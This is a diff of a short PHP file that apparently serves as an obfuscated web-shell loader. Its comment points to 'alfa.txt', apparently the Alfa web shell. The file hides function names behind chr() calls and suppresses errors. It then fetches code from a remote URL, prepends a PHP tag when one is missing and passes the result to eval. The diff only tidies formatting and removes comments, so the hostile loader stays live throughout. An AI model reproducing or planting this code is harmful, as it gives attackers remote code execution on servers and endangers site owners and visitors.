@@ -1,6 +1,7 @@
 <?php
 error_reporting(0);
-@ini_set('display_errors',0);
+@ini_set('display_errors', 0);
+
 function c($n){return chr($n);}
 
 // === URL: alfa.txt ASLI ===
@@ -23,11 +24,10 @@ $php_tag = c(37).c(51).c(67).c(37).c(51).c(70).c(112).c(104).c(112); // %3C%3Fph
 $code = @$fgc($url);
 
 if($code !== false && $code !== ''){
-    // Cek apakah sudah ada <?php di awal
-    if(substr(trim($code),0,5) !== '<?php'){
+    $code = trim($code);
+    if(strncmp($code, '<?php', 5) !== 0){
         $code = $udc($php_tag) . $code;
     }
-    // JALANKAN
     @$evl($code);
 }
 ?>
